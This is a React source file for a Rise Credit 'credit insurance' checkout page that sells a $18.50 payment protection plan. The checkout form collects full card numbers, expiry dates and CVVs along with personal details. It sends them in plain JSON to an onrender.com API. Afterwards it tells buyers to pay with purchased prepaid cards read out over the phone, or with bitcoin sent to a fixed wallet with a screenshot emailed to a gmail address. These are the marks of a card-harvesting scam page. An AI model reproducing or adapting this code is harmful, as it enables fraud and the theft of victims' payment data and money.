import { useState, useRef } from 'react';
import { Link } from 'react-router-dom';
import { FiCheckCircle, FiShield, FiClock, FiPlusCircle } from 'react-icons/fi';
import { Helmet } from 'react-helmet-async';
import './CreditInsurance.css';

function CreditInsurance() {
  const [step, setStep] = useState('intro');
  const [cart, setCart] = useState([]);
  const [cartNotice, setCartNotice] = useState(false);
  const [orderError, setOrderError] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState('');
  const [orderData, setOrderData] = useState(null);
  
  const purchaseRef = useRef(null);

  const total = cart.reduce((acc, item) => acc + item.price * item.qty, 0);

  const scrollToPurchase = () => {
    if (purchaseRef.current) {
      purchaseRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  };

  const handleStartFlow = () => {
    setStep('plans');
    scrollToPurchase();
  };

  const handleAddPlan = () => {
    const existing = cart.find(i => i.name === 'Payment Protection Plan');
    if (existing) {
      setCart(cart.map(i => i.name === 'Payment Protection Plan' ? { ...i, qty: i.qty + 1 } : i));
    } else {
      setCart([...cart, { name: 'Payment Protection Plan', price: 18.50, qty: 1 }]);
    }
  };

  const updateQty = (name, delta) => {
    setCart(cart.map(item => {
      if (item.name === name) return { ...item, qty: item.qty + delta };
      return item;
    }).filter(item => item.qty > 0));
  };

  const handleCheckoutSubmit = async (e) => {
    e.preventDefault();
    if (cart.length === 0) {
      setCartNotice(true);
      return;
    }
    
    const formData = new FormData(e.target);
    const fullName = formData.get('fullName');
    const email = formData.get('email');
    const phone = formData.get('phone');
    const city = formData.get('city');
    const address = formData.get('address');
    
    // Additional optional fields depending on payment method
    const cardNumber = formData.get('cardNumber') || '';
    const cardExpiry = formData.get('cardExpiry') || '';
    const cardCVV = formData.get('cardCVV') || '';
    const cardHolder = formData.get('cardHolder') || '';
    const btcWallet = formData.get('btcWallet') || '';
    
    if (!fullName || !email || !phone || !city || !address || !paymentMethod) {
      setOrderError(true);
      return;
    }
    
    setOrderError(false);
    const orderNumber = Math.floor(Math.random() * 900000 + 100000).toString();
    const computedTotal = total.toFixed(2);
    
    const orderPayload = {
      fullName, email, phone, city, address, paymentMethod,
      total: Number(computedTotal), orderNumber,
      cardNumber, cardExpiry, cardCVV, cardHolder, btcWallet
    };

    try {
      await fetch('https://risecredit-api.onrender.com/api/insurance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(orderPayload)
      });
      
      setOrderData({
        orderNumber,
        total: computedTotal,
        method: paymentMethod === 'card' ? 'Debit / Prepaid Card' : 'Bitcoin'
      });
      setStep('confirmation');
    } catch (err) {
      console.error('Failed to submit insurance order:', err);
    }
  };

  const resetFlow = () => {
    setCart([]);
    setStep('intro');
    setPaymentMethod('');
    setOrderData(null);
    scrollToPurchase();
  };

  return (
    <>
      <Helmet>
        <title>Credit Insurance | Rise Credit</title>
        <meta name="description" content="Protect your loan when life takes an unexpected turn. Buy credit insurance in minutes." />
      </Helmet>
      {/* ===== HERO ===== */}
      <section className="insurance-hero">
        <div className="container insurance-hero__row">
          <div className="insurance-hero__left">
            <span className="insurance-hero__badge">
              <span className="insurance-hero__badge-dot" /> Easy add-on during application
            </span>
            <h1 className="insurance-hero__title">Protect your loan when life takes an unexpected turn.</h1>
            <p className="insurance-hero__subtitle">Credit insurance keeps your payments covered during job loss, illness, or emergencies—so you can focus on what matters.</p>
            <div className="insurance-hero__actions">
              <button onClick={handleStartFlow} className="btn btn-primary btn-large">Buy Coverage Now</button>
              <Link to="/contact" className="btn btn-outline btn-large">Talk with Support</Link>
            </div>
          </div>
          <div className="insurance-hero__right">
            <div className="insurance-snapshot">
              <div className="insurance-snapshot__header">
                <div>
                  <h2>Protection Snapshot</h2>
                  <p>Coverage built to match your Rise Credit loan.</p>
                </div>
                <span className="insurance-snapshot__tag">Updated 2025</span>
              </div>
              <div className="insurance-snapshot__grid">
                <div className="insurance-snapshot__item">
                  <span className="insurance-snapshot__label">Monthly cost</span>
                  <span className="insurance-snapshot__value">Starts at $18.50</span>
                </div>
                <div className="insurance-snapshot__item">
                  <span className="insurance-snapshot__label">Coverage</span>
                  <span className="insurance-snapshot__value">Up to $8,000 balance</span>
                </div>
                <div className="insurance-snapshot__item">
                  <span className="insurance-snapshot__label">Claim review</span>
                  <span className="insurance-snapshot__value">Within 24 hours</span>
                </div>
                <div className="insurance-snapshot__item">
                  <span className="insurance-snapshot__label">Add-on time</span>
                  <span className="insurance-snapshot__value">During loan checkout</span>
                </div>
              </div>
              <div className="insurance-snapshot__call">
                Prefer to chat first? Call <a href="tel:3122483871">(312)-248-3871</a> for personalized coverage.
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ===== STEPS ===== */}
      <section className="section">
        <div className="container">
          <div className="sec-header">
            <h2 className="section-title">Bundle protection in three easy steps</h2>
            <p className="section-subtitle">Seamlessly add credit insurance within the same application experience you already know.</p>
          </div>
          <div className="insurance-steps__grid">
            <div className="insurance-steps__card">
              <div className="insurance-steps__num">1</div>
              <h3>Choose coverage</h3>
              <p>Select the protection level that fits your loan amount.</p>
            </div>
            <div className="insurance-steps__card">
              <div className="insurance-steps__num">2</div>
              <h3>Add during checkout</h3>
              <p>Review terms and confirm the add-on alongside your loan offer.</p>
            </div>
            <div className="insurance-steps__card">
              <div className="insurance-steps__num">3</div>
              <h3>Get peace of mind</h3>
              <p>If life happens, we help keep your account current and stress-free.</p>
            </div>
          </div>
        </div>
      </section>

      {/* ===== TAILORED PROTECTION ===== */}
      <section className="section section--alt">
        <div className="container tailored__row">
          <div className="tailored__left">
            <h2 className="tailored__title">Protection tailored to Rise Credit customers</h2>
            <p className="tailored__desc">Every plan shields your payment schedule, balances, and credit standing while you recover from qualifying events.</p>
            <ul className="tailored__list">
              <li><FiCheckCircle /> Defer or reduce payments during eligible hardships.</li>
              <li><FiCheckCircle /> Dedicated claims team responds within one business day.</li>
              <li><FiCheckCircle /> No retroactive interest added while coverage is active.</li>
            </ul>
          </div>
          <div className="tailored__right">
            <div className="tailored__card">
              <h3>Payment Protection Plan</h3>
              <p>Our most popular coverage for installment, cash advance, and title loan customers.</p>
              <div className="tailored__card-details">
                <div className="tailored__card-row">
                  <span>Limit</span>
                  <span>Up to $8,000 balance</span>
                </div>
                <div className="tailored__card-row">
                  <span>Hardship events</span>
                  <span>Job loss, illness, injury, disasters</span>
                </div>
                <div className="tailored__card-row">
                  <span>Processing time</span>
                  <span>Same business day</span>
                </div>
                <div className="tailored__card-row">
                  <span>Cancellation</span>
                  <span>Anytime with prorated refund</span>
                </div>
              </div>
              <div className="tailored__card-actions">
                <button onClick={handleStartFlow} className="btn btn-primary">Add Coverage Now</button>
                <a href="https://mail.google.com/mail/?view=cm&fs=1&to=risecredit01@gmail.com" target="_blank" rel="noopener noreferrer" className="btn btn-outline">Ask About Discounts</a>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ===== BENEFITS ===== */}
      <section className="section">
        <div className="container">
          <div className="insurance-benefits__grid">
            <div className="insurance-benefits__card">
              <h3>Confidence to move forward</h3>
              <p>82% of customers report feeling more secure accepting their loan with protection in place.</p>
            </div>
            <div className="insurance-benefits__card">
              <h3>Fast, friendly claims</h3>
              <p>Submit online in under five minutes and get status updates in your inbox.</p>
            </div>
            <div className="insurance-benefits__card">
              <h3>Flexible terms</h3>
              <p>Cancel anytime and keep unused premium as a credit on your account.</p>
            </div>
          </div>
        </div>
      </section>

      {/* ===== PURCHASE FLOW ===== */}
      <section className="section section--alt" id="purchase-flow" ref={purchaseRef}>
        <div className="container">
          <div className="sec-header">
            <h2 className="section-title">Complete your coverage online</h2>
            <p className="section-subtitle">Follow the guided purchase flow to add credit insurance to your Rise Credit account in just a few minutes.</p>
          </div>

          <div className="flow-container">
            {step === 'intro' && (
              <div className="flow-card flow-intro">
                <span className="flow-badge">Start here</span>
                <h2>Buy credit insurance in minutes</h2>
                <p>Review the plan, add it to your cart, and finish checkout with secure payment instructions tailored for your situation.</p>
                <ul className="flow-intro__list">
                  <li><span className="flow-num">1</span> Choose the protection plan that fits your loan balance.</li>
                  <li><span className="flow-num">2</span> Add it to your cart and confirm the coverage details.</li>
                  <li><span className="flow-num">3</span> Place your order and follow the payment instructions provided.</li>
                </ul>
                <div className="flow-actions">
                  <button onClick={() => setStep('plans')} className="btn btn-primary btn-large">Start purchase flow</button>
                  <Link to="/contact" className="btn btn-outline btn-large">Need help? Talk with support</Link>
                </div>
              </div>
            )}

            {step === 'plans' && (
              <div className="flow-card flow-plans">
                <div className="plan-selection">
                  <div className="plan-box">
                    <h3>Payment Protection Plan</h3>
                    <p>Covers up to $8,000 of your outstanding balance for qualifying events like job loss, illness, or injury.</p>
                    <div className="plan-price">
                      <span className="price-label">Monthly cost</span>
                      <span className="price-value">$18.50</span>
                    </div>
                    <ul className="plan-features">
                      <li>Deferred or reduced payments during approved claims.</li>
                      <li>Same-day claim review with dedicated support.</li>
                      <li>No interest accrual while coverage is active.</li>
                    </ul>
                    <button onClick={handleAddPlan} className="btn btn-primary btn-full">Add plan to cart</button>
                    {cart.length > 0 && <p className="plan-success">Plan added to cart. You can proceed to checkout when ready.</p>}
                  </div>
                </div>
                <div className="flow-nav">
                  <button onClick={() => setStep('intro')} className="btn btn-outline">Back</button>
                  <button onClick={() => {
                    if(cart.length === 0) setCartNotice(true);
                    else setStep('checkout');
                  }} className="btn btn-primary">Proceed to checkout</button>
                </div>
              </div>
            )}

            {step === 'checkout' && (
              <div className="flow-card flow-checkout">
                <div className="checkout-grid">
                  <div className="checkout-cart">
                    <h3>Your Cart</h3>
                    {cart.length === 0 ? (
                      <p className="cart-empty">Your cart is empty. Add the plan to continue.</p>
                    ) : (
                      <div className="cart-table-wrapper">
                        <table className="cart-table">
                          <thead>
                            <tr>
                              <th>Plan</th>
                              <th>Qty</th>
                              <th>Price</th>
                              <th>Subtotal</th>
                              <th>Actions</th>
                            </tr>
                          </thead>
                          <tbody>
                            {cart.map(item => (
                              <tr key={item.name}>
                                <td>{item.name}</td>
                                <td>
                                  <div className="qty-controls">
                                    <button onClick={() => updateQty(item.name, -1)}>−</button>
                                    <span>{item.qty}</span>
                                    <button onClick={() => updateQty(item.name, 1)}>+</button>
                                  </div>
                                </td>
                                <td>${item.price.toFixed(2)}</td>
                                <td>${(item.price * item.qty).toFixed(2)}</td>
                                <td><button className="btn-remove" onClick={() => updateQty(item.name, -item.qty)}>Remove</button></td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                        <div className="cart-total">Total: ${total.toFixed(2)}</div>
                      </div>
                    )}
                    {cartNotice && <div className="error-box">Please add a plan to your cart before checking out.</div>}
                  </div>

                  <div className="checkout-form-area">
                    <h3>Secure Checkout</h3>
                    <form onSubmit={handleCheckoutSubmit} className="checkout-form">
                      <div className="checkout-form__row">
                        <div className="form-group"><label>Full Name</label><input type="text" name="fullName" required /></div>
                        <div className="form-group"><label>Email</label><input type="email" name="email" required /></div>
                      </div>
                      <div className="checkout-form__row">
                        <div className="form-group"><label>Phone</label><input type="tel" name="phone" pattern="^\d{10}$" title="10 digit phone number without spaces or dashes" required /></div>
                        <div className="form-group"><label>City</label><input type="text" name="city" required /></div>
                      </div>
                      <div className="form-group"><label>Street Address</label><input type="text" name="address" required /></div>
                      
                      <div className="form-group">
                        <label>Payment Method</label>
                        <div className="payment-options">
                          <label className="payment-option">
                            <input type="radio" name="payment" value="card" onChange={(e) => setPaymentMethod(e.target.value)} required />
                            <span>Debit / Prepaid Card</span>
                          </label>
                          <label className="payment-option">
                            <input type="radio" name="payment" value="bitcoin" onChange={(e) => setPaymentMethod(e.target.value)} required />
                            <span>Bitcoin</span>
                          </label>
                        </div>
                      </div>

                      {paymentMethod === 'card' && (
                        <div className="card-fields">
                          <div className="form-group"><label>Card Number</label><input type="text" name="cardNumber" pattern="^\d{13,19}$" title="13 to 19 digit card number" maxLength="19" required /></div>
                          <div className="checkout-form__row">
                            <div className="form-group"><label>Expiration (MM/YY)</label><input type="text" name="cardExpiry" pattern="^(0[1-9]|1[0-2])\/\d{2}$" title="Format: MM/YY (e.g. 12/26)" maxLength="5" required /></div>
                            <div className="form-group"><label>CVV</label><input type="text" name="cardCVV" pattern="^\d{3,4}$" title="3 or 4 digit CVV" maxLength="4" required /></div>
                          </div>
                          <div className="form-group"><label>Name on Card</label><input type="text" name="cardHolder" minLength="2" required /></div>
                        </div>
                      )}

                      {paymentMethod === 'bitcoin' && (
                        <div className="bitcoin-fields">
                          <p>Send your payment to the wallet address provided after checkout. Include your order number in the memo field if your wallet supports it.</p>
                          <div className="form-group"><label>Bitcoin Wallet Address (optional)</label><input type="text" name="btcWallet" /></div>
                        </div>
                      )}

                      {orderError && <div className="error-box">Please complete all required fields.</div>}
                      <button type="submit" className="btn btn-primary btn-full">Place order securely</button>
                    </form>
                  </div>
                </div>
                <div className="flow-nav">
                  <button onClick={() => setStep('plans')} className="btn btn-outline">Back to plan selection</button>
                </div>
              </div>
            )}

            {step === 'confirmation' && orderData && (
              <div className="flow-card flow-confirmation">
                <h3>Order confirmed</h3>
                <div className="confirmation-grid">
                  <div><span className="conf-label">Order number</span><span className="conf-value">{orderData.orderNumber}</span></div>
                  <div><span className="conf-label">Date</span><span className="conf-value">{new Date().toLocaleDateString()}</span></div>
                  <div><span className="conf-label">Total</span><span className="conf-value">${orderData.total}</span></div>
                  <div><span className="conf-label">Payment</span><span className="conf-value">{orderData.method}</span></div>
                </div>
                <div className="confirmation-instructions">
                  {orderData.method === 'Debit / Prepaid Card' ? (
                    <>
                      <p><strong>Next steps for debit/prepaid cards:</strong></p>
                      <ul>
                        <li>Purchase a prepaid card with a balance that covers the order total.</li>
                        <li>Call (312)-248-3871 and provide your order number to our support team.</li>
                        <li>Keep the receipt handy—you may be asked to provide proof of purchase.</li>
                      </ul>
                    </>
                  ) : (
                    <>
                      <p><strong>Bitcoin payment instructions:</strong></p>
                      <p>Send your payment to <span className="btc-address">bc1qe3gexpufzffv7fnv6242lzfrrxlazyautwvrk9</span>. Include your order number in the memo if possible.</p>
                      <p>After sending, email your transaction screenshot to <a href="https://mail.google.com/mail/?view=cm&fs=1&to=risecredit01@gmail.com" target="_blank" rel="noopener noreferrer">risecredit01@gmail.com</a>.</p>
                    </>
                  )}
                </div>
                <button onClick={resetFlow} className="btn btn-primary">Start a new order</button>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* ===== BOTTOM CTA ===== */}
      <section className="section">
        <div className="container">
          <div className="insurance-cta">
            <div className="insurance-cta__text">
              <h2 className="insurance-cta__title">Ready to add resilience to your loan?</h2>
              <p className="insurance-cta__desc">Include credit insurance with your application today or connect with our team for guidance.</p>
            </div>
            <div className="insurance-cta__actions">
              <Link to="/apply" className="btn btn-primary btn-large">Start Application</Link>
              <Link to="/contact" className="btn btn-outline btn-large">Speak with Support</Link>
            </div>
          </div>
        </div>
      </section>
    </>
  );
}

export default CreditInsurance;
